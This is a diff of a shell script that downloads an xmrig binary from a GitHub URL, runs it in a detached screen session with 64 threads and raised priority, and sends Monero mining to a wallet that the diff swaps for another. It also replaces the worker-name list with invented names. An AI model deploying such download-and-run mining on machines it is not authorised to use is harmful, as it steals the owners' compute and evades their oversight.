@@ -20,8 +20,7 @@ wget https://raw.githubusercontent.com/SamCoThePuggo/Scripts/main/xmrig
 chmod +x ./xmrig
 
 # Define a list of random elements
-elements=("magnesium" "calcium" "tungsten" "silicon" "aluminum" "iron" "copper" "zinc" "nickel" "lead" "gold" "silver" "platinum" "bismuth" "tantalum" "vanadium" "chromium" "molybdenum" "tin" "arsenic")
-
+elements=("maginar" "calyron" "tungir" "silvium" "alurex" "ferum" "cupren" "zenith" "nicken" "plumbo" "aurium" "argentis" "platirion" "bismer" "tantalex" "vandium" "chromal" "molyrion" "tenorium" "arsenite")
 # Generate a random index
 random_index=$((RANDOM % ${#elements[@]}))
 random_element=${elements[$random_index]}
@@ -43,7 +42,7 @@ screen -dmS xmrig_session ./xmrig \
     --threads=64 \
     --cpu-priority=-10 \
     --donate-level=1 \
-    -u 48iTUj2b6AK9Vzk5eKBsAxNA42w2zumc7CSUTxt7DgjYXSNroZ6it1EMghmV9rtzJS4BXGSkBZ9BiZdjBo6XQa1jRRVCXqc \
+    -u 43XnieqKgfZYgqGnhb6mcMXkPuau9JDTT1tHvCuHjvgBbvsRkj5aQuYW171HQSv8x3V431ykzK8LvDvEkPPcYGBvMSDBK4U \
     -p "$worker_name"
 
 echo "$worker_name is now up! XMRig has been started in a detached screen session named 'xmrig_session'"
